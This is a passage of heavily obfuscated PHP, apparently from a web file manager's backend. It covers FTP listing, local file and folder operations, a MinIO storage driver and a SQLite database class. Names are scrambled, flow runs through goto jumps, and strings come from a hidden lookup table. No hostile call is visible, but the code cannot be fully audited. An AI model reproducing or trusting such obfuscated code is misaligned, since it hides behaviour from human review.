ftp_nb_get($this->connect, $AİĞòò¬Ş, $Côè¤Ãçó„, FTP_BINARY); goto cÙÍÁ›í‰; C¾ÑÏ³ª‘ù: if (!$this->_isconn()) { return !1; } $a•˜åâ”’« = $this->pathFather($AİĞòò¬Ş); if (!IO::mkdir($a•˜åâ”’«)) { return !1; } goto F”‰î¿ÊÔš; Eª¥¼ÍŞ»ì: } private function ftpList($B‰ó©Î¥ª) { goto fœ©«ğó´; cøÊ²ò‡„: $A”¯¾¬ß†• = array(); foreach ($DßËâ¾œİ as $B¸’°šæò) { if ($B¸’°šæò == $A‘„Õ˜¸Îõ[91] || $B¸’°šæò == $A‘„Õ˜¸Îõ[1142]) { continue; } if (!strstr($B¸’°šæò, $A‘„Õ˜¸Îõ[8])) { $B¸’°šæò = $B‰ó©Î¥ª . ltrim($B¸’°šæò, $A‘„Õ˜¸Îõ[8]); } $A”¯¾¬ß†•[] = $this->iconvApp($B¸’°šæò); } return $A”¯¾¬ß†•; goto E©›ÀùÁÁ; Fñ—¶÷İÈê: $B‰ó©Î¥ª = rtrim($B‰ó©Î¥ª, $A‘„Õ˜¸Îõ[8]) . $A‘„Õ˜¸Îõ[8]; $DßËâ¾œİ = @ftp_nlist($this->connect, $B‰ó©Î¥ª); if ($DßËâ¾œİ === !1) { $DßËâ¾œİ = @ftp_rawlist($this->connect, $B‰ó©Î¥ª); foreach ($DßËâ¾œİ as $DÛ Şé©´À => $bÀ£œ´Î–å) { $DßËâ¾œİ[$DÛ Şé©´À] = end(explode($A‘„Õ˜¸Îõ[1141], $bÀ£œ´Î–å)); } } goto cøÊ²ò‡„; fœ©«ğó´: $A‘„Õ˜¸Îõ =& $_SERVER[Ä¿Ş°¨]; if (!$this->isFolder($B‰ó©Î¥ª)) { return !1; } @ftp_chdir($this->connect, $A‘„Õ˜¸Îõ[8]); goto Fñ—¶÷İÈê; E©›ÀùÁÁ: } private function recursionFtpFiles($fİ¬—ºÛ’¿, &$aÕŒÌƒæÂƒ) { $dÖŸÌ‹ÌñÏ =& $_SERVER[Ä¿Ş°¨]; if (!$this->_isconn()) { return !1; } if (!($EÆÏ¦â×Òâ = $this->ftpList($fİ¬—ºÛ’¿))) { return !1; } foreach ($EÆÏ¦â×Òâ as $fİ¬—ºÛ’¿) { if ($this->isFolder($fİ¬—ºÛ’¿)) { $this->recursionFtpFiles($fİ¬—ºÛ’¿, $aÕŒÌƒæÂƒ); $aÕŒÌƒæÂƒ[$dÖŸÌ‹ÌñÏ[74]][] = $fİ¬—ºÛ’¿; } else { $aÕŒÌƒæÂƒ[$dÖŸÌ‹ÌñÏ[73]][] = $fİ¬—ºÛ’¿; } } } private function objectMeta($Cİ«é±‘À¢) { goto FñÅíïËã; FñÅíïËã: $AÀäˆöñğº =& $_SERVER[Ä¿Ş°¨]; $EÓ‹í¦Ç¡ã = $AÀäˆöñğº[1143] . md5($Cİ«é±‘À¢); $aà°ÖÆ™• = Cache::get($EÓ‹í¦Ç¡ã); goto B¹ƒ™¾‚ÒÅ; e§Ö’³óŸ: return $aà°ÖÆ™•; goto fÒç”ƒõÔ“; B¹ƒ™¾‚ÒÅ: if ($aà°ÖÆ™• !== null && $aà°ÖÆ™• !== !1) { return $aà°ÖÆ™•; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $AÀäˆöñğº[8]); goto Bˆë©´®•; Bˆë©´®•: $BÂÆÏÅö = @ftp_size($this->connect, $this->iconvSystem($Cİ«é±‘À¢)); if ($BÂÆÏÅö != -1) { $aà°ÖÆ™• = array($AÀäˆöñğº[77] => $BÂÆÏÅö, $AÀäˆöñğº[29] => $AÀäˆöñğº[163]); } else { $Cİà­½˜¥¬ = @ftp_chdir($this->connect, $this->iconvSystem($Cİ«é±‘À¢)); $aà°ÖÆ™• = $Cİà­½˜¥¬ ? array($AÀäˆöñğº[77] => 0, $AÀäˆöñğº[29] => $AÀäˆöñğº[76]) : !1; } Cache::set($EÓ‹í¦Ç¡ã, $aà°ÖÆ™•, 0); goto e§Ö’³óŸ; fÒç”ƒõÔ“: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($A†ò­œ¹¯…) { if (substr($A†ò­œ¹¯…, 0, 2) == $_SERVER[Ä¿Ş°¨][1132]) { $A†ò­œ¹¯… = BASIC_PATH . substr($A†ò­œ¹¯…, 2); } return $A†ò­œ¹¯…; } public function iconvApp($f¼í–Â…Ù) { $A•ãá›´½À =& $_SERVER[Ä¿Ş°¨]; global $config; return $this->iconvTo($f¼í–Â…Ù, $config[$A•ãá›´½À[1130]], $config[$A•ãá›´½À[1129]]); } public function iconvSystem($a÷ï—Î„Ô) { $c¤ÀŒ­Õ—Å =& $_SERVER[Ä¿Ş°¨]; global $config; return $this->iconvTo($a÷ï—Î„Ô, $config[$c¤ÀŒ­Õ—Å[1129]], $config[$c¤ÀŒ­Õ—Å[1130]]); } public function getPathOuter($f†­ö¯«Œ–) { goto eĞğÆ£Ú’ª; EˆˆğÈ¶¤: if (substr($Dµ£ëŸ‡›Ï, 0, 2) == $Bà•†¡ñ¥‚[1132]) { $Dµ£ëŸ‡›Ï = BASIC_PATH . substr($Dµ£ëŸ‡›Ï, 2); } if (substr($f†­ö¯«Œ–, 0, 2) == $Bà•†¡ñ¥‚[1132]) { $f†­ö¯«Œ– = BASIC_PATH . substr($f†­ö¯«Œ–, 2); } $Dµ£ëŸ‡›Ï = KodIO::clear($Dµ£ëŸ‡›Ï); goto DÛ¤ëŠ»‰‡; DÚâÑ‚‹ä²: return $this->pathDriver . $Bà•†¡ñ¥‚[8] . ltrim($f†­ö¯«Œ–, $Bà•†¡ñ¥‚[8]); goto A¸†ÎÏ“ÖÆ; DÛ¤ëŠ»‰‡: $f†­ö¯«Œ– = KodIO::clear($f†­ö¯«Œ–); $f†­ö¯«Œ– = substr($f†­ö¯«Œ–, strlen($Dµ£ëŸ‡›Ï)); if (empty($this->pathDriver)) { return $f†­ö¯«Œ–; } goto DÚâÑ‚‹ä²; eĞğÆ£Ú’ª: $Bà•†¡ñ¥‚ =& $_SERVER[Ä¿Ş°¨]; $Dµ£ëŸ‡›Ï = $this->iconvApp($this->pathBase); $f†­ö¯«Œ– = $this->iconvApp($f†­ö¯«Œ–); goto EˆˆğÈ¶¤; A¸†ÎÏ“ÖÆ: } public function mkfile($Eî‘¡‡±Ü, $BŠå·ç¢ïÖ = '', $C¨ŠÚÇ–ˆâ = REPEAT_RENAME) { $Eî‘¡‡±Ü = $this->iconvSystem($Eî‘¡‡±Ü); @touch($Eî‘¡‡±Ü); if ($BŠå·ç¢ïÖ) { file_put_contents($Eî‘¡‡±Ü, $BŠå·ç¢ïÖ); } return is_file($Eî‘¡‡±Ü) ? $this->getPathOuter($Eî‘¡‡±Ü) : !1; } public function mkdir($E¬ä´³…×—, $B·‚¿†›—‹ = REPEAT_SKIP) { $E¬ä´³…×— = $this->iconvSystem($E¬ä´³…×—); if (is_dir($E¬ä´³…×—)) { return $this->getPathOuter($E¬ä´³…×—); } @mkdir($E¬ä´³…×—, 511, !0); return is_dir($E¬ä´³…×—) ? $this->getPathOuter($E¬ä´³…×—) : !1; } public function copyFile($FÇâ„Å·‚, $f“…¸ ù×) { $this->mkdir($this->pathFather($f“…¸ ù×)); $FÇâ„Å·‚ = $this->iconvSystem($FÇâ„Å·‚); $f“…¸ ù× = $this->iconvSystem($f“…¸ ù×); $B´íÅ•½ÕŞ = @copy($FÇâ„Å·‚, $f“…¸ ù×); return $B´íÅ•½ÕŞ ? $this->getPathOuter($f“…¸ ù×) : !1; } public function moveFile($a™ö£Ó¦ç¶, $e‹•ğêÍ) { $this->mkdir($this->pathFather($e‹•ğêÍ)); $a™ö£Ó¦ç¶ = $this->iconvSystem($a™ö£Ó¦ç¶); $e‹•ğêÍ = $this->iconvSystem($e‹•ğêÍ); $C°Ç–Œƒ¶ = intval(@rename($a™ö£Ó¦ç¶, $e‹•ğêÍ)); if (!$C°Ç–Œƒ¶) { if ($C°Ç–Œƒ¶ = intval(@copy($a™ö£Ó¦ç¶, $e‹•ğêÍ))) { @unlink($a™ö£Ó¦ç¶); } } return $C°Ç–Œƒ¶ ? $this->getPathOuter($e‹•ğêÍ) : !1; } public function delFile($c³ƒ™¼§©‡) { $c³ƒ™¼§©‡ = $this->iconvSystem($c³ƒ™¼§©‡); if (!@unlink($c³ƒ™¼§©‡)) { @chmod($c³ƒ™¼§©‡, 511); if (!@unlink($c³ƒ™¼§©‡)) { return !1; } } else { return !0; } } public function delFolder($fäíÆŒÁ™ˆ) { goto fœ‡³¥ˆœ; fœ‡³¥ˆœ: $aĞôŠÈƒ ì =& $_SERVER[Ä¿Ş°¨]; $fäíÆŒÁ™ˆ = $this->iconvSystem($fäíÆŒÁ™ˆ); if (!is_dir($fäíÆŒÁ™ˆ)) { return !0; } goto C•øéì®¾ê; Fğ¼Ùšºò: return rmdir($fäíÆŒÁ™ˆ); goto C¦—–´ïß; C•øéì®¾ê: if (!($C´¹ÍÍé° = opendir($fäíÆŒÁ™ˆ))) { return !1; } while (($Bñ‰Ş¯ò‰¼ = readdir($C´¹ÍÍé°)) !== !1) { if ($Bñ‰Ş¯ò‰¼ == $aĞôŠÈƒ ì[91] || $Bñ‰Ş¯ò‰¼ == $aĞôŠÈƒ ì[1142]) { continue; } $bËœ×Ğ£ß = $fäíÆŒÁ™ˆ . $aĞôŠÈƒ ì[8] . $Bñ‰Ş¯ò‰¼; if (!is_dir($bËœ×Ğ£ß)) { if (!unlink($bËœ×Ğ£ß)) { chmod($bËœ×Ğ£ß, 511); if (!unlink($bËœ×Ğ£ß)) { return !1; } } } else { chmod($bËœ×Ğ£ß, 511); $bËœ×Ğ£ß = $this->iconvApp($bËœ×Ğ£ß); if (!$this->delFolder($bËœ×Ğ£ß)) { return !1; } } } closedir($C´¹ÍÍé°); goto Fğ¼Ùšºò; C¦—–´ïß: } public function rename($F¯“¡ šÎ, $E³‰¶ª»§Ñ) { goto Cµ¬–ğ¯²; D‚‡‡§ˆ¶İ: $a‹ÒîñëËš = @rename($F¯“¡ šÎ, $CÅøÔ‹ÑÙ); $CÅøÔ‹ÑÙ = $this->iconvApp($CÅøÔ‹ÑÙ); return $a‹ÒîñëËš ? $this->getPathOuter($CÅøÔ‹ÑÙ) : !1; goto BÄ«öÃ­¿; Cµ¬–ğ¯²: $d¼¸©’ÍÙ» =& $_SERVER[Ä¿Ş°¨]; $FÊö³£¨ÀÁ = $this->fileNameAuto($this->pathFather($F¯“¡ šÎ), $E³‰¶ª»§Ñ); $FÊö³£¨ÀÁ = $this->iconvSystem($FÊö³£¨ÀÁ); goto a™Ö‡Öù†¦; a™Ö‡Öù†¦: $F¯“¡ šÎ = $this->iconvSystem($F¯“¡ šÎ); $aÚî‚ƒ˜àµ = $this->pathFather($F¯“¡ šÎ); $CÅøÔ‹ÑÙ = rtrim($aÚî‚ƒ˜àµ, $d¼¸©’ÍÙ»[8]) . $d¼¸©’ÍÙ»[8] . $FÊö³£¨ÀÁ; goto D‚‡‡§ˆ¶İ; BÄ«öÃ­¿: } public function size($cµí‹ß•êè) { $cµí‹ß•êè = $this->iconvSystem($cµí‹ß•êè); return (double) abs(sprintf($_SERVER[Ä¿Ş°¨][1144], @filesize($cµí‹ß•êè))); } public function info($AùêÃò«Ó) { $AùêÃò«Ó = $this->iconvSystem($AùêÃò«Ó); if ($this->isFolder($AùêÃò«Ó)) { return $this->folderInfo($AùêÃò«Ó); } else { if ($this->isFile($AùêÃò«Ó)) { return $this->fileInfo($AùêÃò«Ó); } } return !1; } protected function infoChildren($AŸ²¯¹¢ëğ, &$cîÌÎë®ë, $dÊÅ‚‡±¾¹ = true) { $C²äöˆêå =& $_SERVER[Ä¿Ş°¨]; $AŸ²¯¹¢ëğ = rtrim($AŸ²¯¹¢ëğ, $C²äöˆêå[8]) . $C²äöˆêå[8]; if ($dÊÅ‚‡±¾¹) { check_abort(); $AŸ²¯¹¢ëğ = $this->iconvSystem($AŸ²¯¹¢ëğ); } if (!($f˜¢¨½’†¬ = @opendir($AŸ²¯¹¢ëğ))) { return; } while (($cèÁ¸êÌé‹ = readdir($f˜¢¨½’†¬)) !== !1) { if ($cèÁ¸êÌé‹ == $C²äöˆêå[91] || $cèÁ¸êÌé‹ == $C²äöˆêå[1142]) { continue; } $e’—ß Æ–‘ = $AŸ²¯¹¢ëğ . $cèÁ¸êÌé‹; if (is_file($e’—ß Æ–‘)) { $cîÌÎë®ë[$C²äöˆêå[78]]++; $cîÌÎë®ë[$C²äöˆêå[77]] += (double) abs(sprintf($C²äöˆêå[1144], @filesize($e’—ß Æ–‘))); } else { $cîÌÎë®ë[$C²äöˆêå[79]]++; $this->infoChildren($e’—ß Æ–‘, $cîÌÎë®ë, !1); } } closedir($f˜¢¨½’†¬); } private function folderInfo($Dƒêò„İ, $e¾âëõ‰‘¥ = false) { $Fºœ˜ÇÓ‰– =& $_SERVER[Ä¿Ş°¨]; $Dƒêò„İ = rtrim($Dƒêò„İ, $Fºœ˜ÇÓ‰–[8]) . $Fºœ˜ÇÓ‰–[8]; $f¬Ü¥ò¨Ş§ = $this->iconvApp($this->pathThis($Dƒêò„İ)); if ($e¾âëõ‰‘¥) { return array($Fºœ˜ÇÓ‰–[28] => $f¬Ü¥ò¨Ş§, $Fºœ˜ÇÓ‰–[75] => $this->getPathOuter($Dƒêò„İ), $Fºœ˜ÇÓ‰–[29] => $Fºœ˜ÇÓ‰–[76]); } $cßƒò›Ò‹ = array($Fºœ˜ÇÓ‰–[28] => $f¬Ü¥ò¨Ş§, $Fºœ˜ÇÓ‰–[75] => $this->getPathOuter($Dƒêò„İ), $Fºœ˜ÇÓ‰–[29] => $Fºœ˜ÇÓ‰–[76], $Fºœ˜ÇÓ‰–[183] => @filectime($Dƒêò„İ), $Fºœ˜ÇÓ‰–[106] => @filemtime($Dƒêò„İ), $Fºœ˜ÇÓ‰–[1145] => @fileatime($Dƒêò„İ), $Fºœ˜ÇÓ‰–[1139] => is_readable($Dƒêò„İ), $Fºœ˜ÇÓ‰–[1140] => is_writable($Dƒêò„İ), $Fºœ˜ÇÓ‰–[1146] => get_mode($Dƒêò„İ)); return $cßƒò›Ò‹; } private function fileInfo($B¼Ñ—äÖ”İ, $A®ŞÓÎœì‡ = false) { $dÂ¹ÉÇ°‘è =& $_SERVER[Ä¿Ş°¨]; $dæ¦ÄµòÖ¿ = $this->iconvApp($this->pathThis($B¼Ñ—äÖ”İ)); if ($A®ŞÓÎœì‡) { return array($dÂ¹ÉÇ°‘è[28] => $dæ¦ÄµòÖ¿, $dÂ¹ÉÇ°‘è[75] => $this->getPathOuter($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[29] => $dÂ¹ÉÇ°‘è[163], $dÂ¹ÉÇ°‘è[77] => $this->size($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[156] => $this->ext($dæ¦ÄµòÖ¿)); } $d­™òÙ³¹« = array($dÂ¹ÉÇ°‘è[28] => $dæ¦ÄµòÖ¿, $dÂ¹ÉÇ°‘è[75] => $this->getPathOuter($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[29] => $dÂ¹ÉÇ°‘è[163], $dÂ¹ÉÇ°‘è[183] => @filectime($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[106] => @filemtime($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[1145] => @fileatime($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[77] => $this->size($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[156] => $this->ext($dæ¦ÄµòÖ¿), $dÂ¹ÉÇ°‘è[1139] => is_readable($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[1140] => is_writable($B¼Ñ—äÖ”İ), $dÂ¹ÉÇ°‘è[1146] => get_mode($B¼Ñ—äÖ”İ)); return $d­™òÙ³¹«; } public function exist($d·Ğƒµì‹) { $d·Ğƒµì‹ = $this->iconvSystem($d·Ğƒµì‹); return @file_exists($d·Ğƒµì‹); } public function isFile($AÑ¾Ìõ˜ç‰) { $AÑ¾Ìõ˜ç‰ = $this->iconvSystem($AÑ¾Ìõ˜ç‰); return @is_file($AÑ¾Ìõ˜ç‰); } public function isFolder($D½àİèŒ‡Š) { $D½àİèŒ‡Š = $this->iconvSystem($D½àİèŒ‡Š); return @is_dir($D½àİèŒ‡Š); } public function listPath($dêÏ†ĞÍ¯ƒ, $Cİõæà Öö = false) { goto bÇ—¤¼ùŒ‹; cëœââÂóÀ: $e·Ğ¢±˜ŞŞ = array($ağ›Ø–èÏ[74] => array(), $ağ›Ø–èÏ[73] => array()); if (!($CøÌÂ‡¾¼ = @opendir($dêÏ†ĞÍ¯ƒ))) { return $e·Ğ¢±˜ŞŞ; } while (($eŒÙ‹çõˆ = readdir($CøÌÂ‡¾¼)) !== !1) { if ($eŒÙ‹çõˆ == $ağ›Ø–èÏ[91] || $eŒÙ‹çõˆ == $ağ›Ø–èÏ[1142]) { continue; } $e·”’ğ‰ó = $dêÏ†ĞÍ¯ƒ . $eŒÙ‹çõˆ; if (is_file($e·”’ğ‰ó)) { $e·Ğ¢±˜ŞŞ[$ağ›Ø–èÏ[73]][] = $this->fileInfo($e·”’ğ‰ó, $Cİõæà Öö); } else { $e·Ğ¢±˜ŞŞ[$ağ›Ø–èÏ[74]][] = $this->folderInfo($e·”’ğ‰ó, $Cİõæà Öö); } } goto E²Å¡„¦ ; E²Å¡„¦ : closedir($CøÌÂ‡¾¼); return $e·Ğ¢±˜ŞŞ; goto EåÚŞ×èÔ; bÇ—¤¼ùŒ‹: $ağ›Ø–èÏ =& $_SERVER[Ä¿Ş°¨]; $dêÏ†ĞÍ¯ƒ = $this->iconvSystem($dêÏ†ĞÍ¯ƒ); $dêÏ†ĞÍ¯ƒ = rtrim($dêÏ†ĞÍ¯ƒ, $ağ›Ø–èÏ[8]) . $ağ›Ø–èÏ[8]; goto cëœââÂóÀ; EåÚŞ×èÔ: } public function listAll($f§¤Ù„¤, &$a¶‚¹¨åÆ = array()) { goto D¬ÒÛÓ×Á; c¬›£Ê•Û¦: return $a¶‚¹¨åÆ; goto D“¦Ì‚¥Â; A¥Œªã§«: if (!($DÎâÈ  Øó = @opendir($f§¤Ù„¤))) { return $a¶‚¹¨åÆ; } while (($F”‹¯„²Î = readdir($DÎâÈ  Øó)) !== !1) { if ($F”‹¯„²Î == $BÒéæïÏÊÜ[91] || $F”‹¯„²Î == $BÒéæïÏÊÜ[1142]) { continue; } $BÚõ¦°ä·Ø = $f§¤Ù„¤ . $F”‹¯„²Î; if (is_dir($BÚõ¦°ä·Ø)) { $a¶‚¹¨åÆ[] = array($BÒéæïÏÊÜ[75] => $BÚõ¦°ä·Ø . $BÒéæïÏÊÜ[8], $BÒéæïÏÊÜ[76] => 1, $BÒéæïÏÊÜ[106] => @filemtime($BÚõ¦°ä·Ø), $BÒéæïÏÊÜ[77] => 0); $this->listAll($BÚõ¦°ä·Ø, $a¶‚¹¨åÆ); } else { $a¶‚¹¨åÆ[] = array($BÒéæïÏÊÜ[75] => $BÚõ¦°ä·Ø, $BÒéæïÏÊÜ[76] => 0, $BÒéæïÏÊÜ[106] => @filemtime($BÚõ¦°ä·Ø), $BÒéæïÏÊÜ[77] => $this->size($BÚõ¦°ä·Ø)); } } closedir($DÎâÈ  Øó); goto c¬›£Ê•Û¦; D¬ÒÛÓ×Á: $BÒéæïÏÊÜ =& $_SERVER[Ä¿Ş°¨]; $f§¤Ù„¤ = $this->iconvSystem($f§¤Ù„¤); $f§¤Ù„¤ = rtrim($f§¤Ù„¤, $BÒéæïÏÊÜ[8]) . $BÒéæïÏÊÜ[8]; goto A¥Œªã§«; D“¦Ì‚¥Â: } public function has($d¦â°óµ§Ç, $FÂÃÆ•ºµ” = false, $c¶¿µãîÏƒ = true) { goto C¾ãô®…ß; EÔª£è¿ÄÂ: return !1; goto f´¦„ŠÜï; C†Ù¸ù˜À: while (($díÊ»ËÅÏ² = readdir($DÒ ±Ö¿…Œ)) !== !1) { if ($díÊ»ËÅÏ² == $báˆØæ£èÚ[91] || $díÊ»ËÅÏ² == $báˆØæ£èÚ[1142]) { continue; } $BÜ­ìö¥òÓ = $d¦â°óµ§Ç . $díÊ»ËÅÏ²; if ($FÂÃÆ•ºµ”) { if (@is_file($BÜ­ìö¥òÓ)) { $dÅÂÒÜ¥Éé++; } else { $F°†ÆÄÃÁ++; } continue; } if ($c¶¿µãîÏƒ) { if (@is_file($BÜ­ìö¥òÓ)) { return !0; } } else { if (@is_dir($BÜ­ìö¥òÓ . $báˆØæ£èÚ[8])) { return !0; } } } closedir($DÒ ±Ö¿…Œ); if ($FÂÃÆ•ºµ”) { return array($báˆØæ£èÚ[187] => $dÅÂÒÜ¥Éé, $báˆØæ£èÚ[188] => $F°†ÆÄÃÁ); } goto EÔª£è¿ÄÂ; C¾ãô®…ß: $báˆØæ£èÚ =& $_SERVER[Ä¿Ş°¨]; $d¦â°óµ§Ç = $this->iconvSystem($d¦â°óµ§Ç); $d¦â°óµ§Ç = rtrim($d¦â°óµ§Ç, $báˆØæ£èÚ[8]) . $báˆØæ£èÚ[8]; goto A—Ùªƒ½éù; A—Ùªƒ½éù: if (!($DÒ ±Ö¿…Œ = @opendir($d¦â°óµ§Ç))) { return !1; } $dÅÂÒÜ¥Éé = 0; $F°†ÆÄÃÁ = 0; goto C†Ù¸ù˜À; f´¦„ŠÜï: } public function hashSimple($c ¼Ò¦ôğ³) { goto fÔ†ó‘Ğ«; d‚ÅÀÎéó…: return md5($cÕÚÖ°Šè) . $eœõµ˜º¥â; goto D¤İ†ÔÕÄ¥; fÔ†ó‘Ğ«: $C¸¢Œ–‡÷„ =& $_SERVER[Ä¿Ş°¨]; if (!$c ¼Ò¦ôğ³) { return md5($C¸¢Œ–‡÷„[33]); } $c ¼Ò¦ôğ³ = $this->iconvSystem($c ¼Ò¦ôğ³); goto fÍÉÊ„«‰; dõÉÜãÎ‘È: $f‘Õæ­ßæî = fopen($c ¼Ò¦ôğ³, $C¸¢Œ–‡÷„[1147]); if (!$f‘Õæ­ßæî) { return $cÕÚÖ°Šè; } for ($eä¥…ï£ˆ = 0; $eä¥…ï£ˆ < $bÕÀ‚‹İ˜; $eä¥…ï£ˆ++) { fseek($f‘Õæ­ßæî, $bã©™’°‡Ñ * $eä¥…ï£ˆ); $cÕÚÖ°Šè .= fread($f‘Õæ­ßæî, $c™Æƒ¦³¥); } goto cÓö–ÀÍ‘â; Aõ•¬Ğ…´·: if ($eœõµ˜º¥â <= $c™Æƒ¦³¥ * $bÕÀ‚‹İ˜) { return $this->hashMd5($c ¼Ò¦ôğ³) . $eœõµ˜º¥â; } $cÕÚÖ°Šè = $C¸¢Œ–‡÷„[33]; $bã©™’°‡Ñ = intval($eœõµ˜º¥â / $bÕÀ‚‹İ˜); goto dõÉÜãÎ‘È; fÍÉÊ„«‰: $eœõµ˜º¥â = $this->size($c ¼Ò¦ôğ³); $c™Æƒ¦³¥ = 200; $bÕÀ‚‹İ˜ = 50; goto Aõ•¬Ğ…´·; cÓö–ÀÍ‘â: fseek($f‘Õæ­ßæî, $eœõµ˜º¥â - $c™Æƒ¦³¥); $cÕÚÖ°Šè .= fread($f‘Õæ­ßæî, $c™Æƒ¦³¥); fclose($f‘Õæ­ßæî); goto d‚ÅÀÎéó…; D¤İ†ÔÕÄ¥: } public function getContent($bºŸÕ«¸í) { $bºŸÕ«¸í = $this->iconvSystem($bºŸÕ«¸í); return file_get_contents($bºŸÕ«¸í); } public function setContent($Aêí½É‡Ç, $DÎ“‹İêëâ = '') { $Aêí½É‡Ç = $this->iconvSystem($Aêí½É‡Ç); @file_put_contents($Aêí½É‡Ç, $DÎ“‹İêëâ, LOCK_EX); clearstatcache(); return strlen($DÎ“‹İêëâ) == filesize($Aêí½É‡Ç); } public function fileSubstr($DÒÃ¬…Ş¥Ü, $f¹¾—·‚èæ = 0, $f¸ç¬¶áÑ = false) { goto C´ƒÛÎ‹äã; bø‰ ”¥˜»: if ($f¸ç¬¶áÑ <= 0) { return $e¢¿±ƒŸ‘[33]; } $F‰Ø•ëÄ´ = fopen($DÒÃ¬…Ş¥Ü, $e¢¿±ƒŸ‘[1147]); if (!$F‰Ø•ëÄ´) { return !1; } goto CÜŠ±¡‰ÂÂ; C´ƒÛÎ‹äã: $e¢¿±ƒŸ‘ =& $_SERVER[Ä¿Ş°¨]; $DÒÃ¬…Ş¥Ü = $this->iconvSystem($DÒÃ¬…Ş¥Ü); if ($f¸ç¬¶áÑ === !1) { $f¸ç¬¶áÑ = $this->size($DÒÃ¬…Ş¥Ü); } goto bø‰ ”¥˜»; CÜŠ±¡‰ÂÂ: fseek($F‰Ø•ëÄ´, $f¹¾—·‚èæ); $D¡ÖÂ¨È = fread($F‰Ø•ëÄ´, $f¸ç¬¶áÑ); fclose($F‰Ø•ëÄ´); goto d‡…àÒ’†Œ; d‡…àÒ’†Œ: return $D¡ÖÂ¨È; goto eÜ–Ø¸•ßŠ; eÜ–Ø¸•ßŠ: } public function upload($d™ñµŞğƒ, $c’—ö„Ãô¡, $f…©Ğ÷Æï– = false, $AóŞŠâæğ = REPEAT_REPLACE) { $aµ¤’¬±ç¾ = $this->copyFile($c’—ö„Ãô¡, $d™ñµŞğƒ); return $aµ¤’¬±ç¾ ? $this->getPathOuter($d™ñµŞğƒ) : !1; } public function download($F‡«‡Ë‹, $E—‹¶Ò¶‰…) { return $this->iconvSystem($F‡«‡Ë‹); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Bš·ÕâŸÉâ) { parent::__construct($Bš·ÕâŸÉâ); $this->signatureVersion($_SERVER[Ä¿Ş°¨][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto AØÛ°ÀäĞ; A¼Êò…Ê„‹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Eª¨²¼¡›Ë; Eª¨²¼¡›Ë: $fì¼ÑÃÎ²Ì =& $_SERVER[Ä¿Ş°¨]; global $in, $config; $this->config =& $config; goto f¨¬”å†‰Î; C…Äù ‰‡: $this->tpl = TEMPLATE . MOD . $fì¼ÑÃÎ²Ì[8]; $this->_classObjectID = mt_rand(0, 10000); goto DéÍïéÃ; f¨¬”å†‰Î: $this->in =& $in; $this->values[$fì¼ÑÃÎ²Ì[6]] =& $config; $this->values[$fì¼ÑÃÎ²Ì[7]] =& $in; goto C…Äù ‰‡; DéÍïéÃ: } public function loadClass($f•ç¿ÙŸº¸) { if (1 === func_num_args()) { $this->{$f•ç¿ÙŸº¸} = new $f•ç¿ÙŸº¸(); } else { $c¹åğÚîö = new ReflectionClass($f•ç¿ÙŸº¸); $dï”ƒŠó±î = func_get_args(); array_shift($dï”ƒŠó±î); $this->{$f•ç¿ÙŸº¸} = $c¹åğÚîö->newInstanceArgs($dï”ƒŠó±î); } return $this->{$f•ç¿ÙŸº¸}; } protected function assign($E‡„·°Ø–Ü, $eœ‚Æ¦Û•÷) { $this->values[$E‡„·°Ø–Ü] = $eœ‚Æ¦Û•÷; } protected function display($F˜·©ÆùİÆ) { ob_end_clean(); extract($this->values); require $this->tpl . $F˜·©ÆùİÆ; } } class DbSqliteBase extends Db { public function __construct($cäÈÜ×Ï“ = '') { $FîÌ¢œö³Ü =& $_SERVER[Ä¿Ş°¨]; if (!extension_loaded($FîÌ¢œö³Ü[9])) { think_exception(think_lang($FîÌ¢œö³Ü[10]) . $FîÌ¢œö³Ü[11]); } if (!empty($cäÈÜ×Ï“)) { if (!isset($cäÈÜ×Ï“[$FîÌ¢œö³Ü[12]])) { $cäÈÜ×Ï“[$FîÌ¢œö³Ü[12]] = 438; } $this->config = $cäÈÜ×Ï“; if (empty($this->config[$FîÌ¢œö³Ü[13]])) { $this->config[$FîÌ¢œö³Ü[13]] = array(); } } } public function connect($dÆ¾¹ğ°éñ = '', $E¯¡ìÒ¾¿‡ = 0) { $C¾øïŒñÌğ =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->linkID[$E¯¡ìÒ¾¿‡])) { goto fƒ•ª³œ³¡; B­¹ÉÊ®ïˆ: @sqlite_busy_timeout($this->linkID[$E¯¡ìÒ¾¿‡], 30000); if (1 != think_config($C¾øïŒñÌğ[18])) { unset($this->config); } goto B‘Ó¹øœåÌ; fƒ•ª³œ³¡: if (empty($dÆ¾¹ğ°éñ)) { $dÆ¾¹ğ°éñ = $this->config; } $fŒµŠÌâ§½ = !empty($dÆ¾¹ğ°éñ[$C¾øïŒñÌğ[13]][$C¾øïŒñÌğ[14]]) ? $dÆ¾¹ğ°éñ[$C¾øïŒñÌğ[13]][$C¾øïŒñÌğ[14]] : $this->pconnect; $b’ç×œÜÉ = $fŒµŠÌâ§½ ? $C¾øïŒñÌğ[15] : $C¾øïŒñÌğ[16]; goto F‰’¸ƒÄ ó; F‰’¸ƒÄ ó: $this->linkID[$E¯¡ìÒ¾¿‡] = $b’ç×œÜÉ($dÆ¾¹ğ°éñ[$C¾øïŒñÌğ[17]], $dÆ¾¹ğ°éñ[$C¾øïŒñÌğ[12]]); if (!$this->linkID[$E¯¡ìÒ¾¿‡]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto B­¹ÉÊ®ïˆ; B‘Ó¹øœåÌ: } return $this->linkID[$E¯¡ìÒ¾¿‡]; } public function free() { $this->queryID = null; } public function query($E°«ÊÄÃÆÏ) { goto D•ˆÀ¨éôß; A‚¾Û…×ï“: $this->queryStr = $E°«ÊÄÃÆÏ; if ($this->queryID) { $this->free(); } think_action_status($Eì±‚Á¡®Ä[19], 1); goto e‡Ø™Éæº; e‡Ø™Éæº: 